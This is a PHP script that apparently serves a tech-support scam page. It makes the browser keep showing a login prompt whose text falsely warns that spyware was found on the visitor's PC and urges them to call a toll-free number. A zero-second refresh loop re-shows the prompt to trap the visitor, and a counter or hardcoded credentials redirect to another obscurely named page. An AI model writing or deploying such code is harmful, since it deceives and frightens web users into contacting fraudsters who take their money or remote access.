<?php

    session_start();

    $_uy = 'dsdsj';
    $_py = 'bgrfd';


    if ($_SERVER['PHP_AUTH_USER'] != $_uy || $_SERVER['PHP_AUTH_PW'] != $_py ) {

        if(isset($_SESSION['login_attempts'])){ $_SESSION['login_attempts']++; }else{$_SESSION['login_attempts'] = 11;}

        if($_SESSION['login_attempts'] == 70){
            header('Location: AAXfsdhfgdshfsd44M.php');
            exit;
        } else {

          header('WWW-Authenticate: Basic realm="Suspicious movement distinguished on your IP address because of a spyware introduced in your PC. Call Toll Free now @ +1-800-201-5464  for any help."');
          header('HTTP/1.0 401 Unauthorized');
$page = $_SERVER['PHP_SELF'];
 $sec = "0";
 header("Refresh: $sec; url=$page");
         echo "<html><head><title></title></head><body>";


            exit;
        }
    } else {

        header('Location: AAXfsdhfgdshfsd44M.php');

        exit;
    }
?>
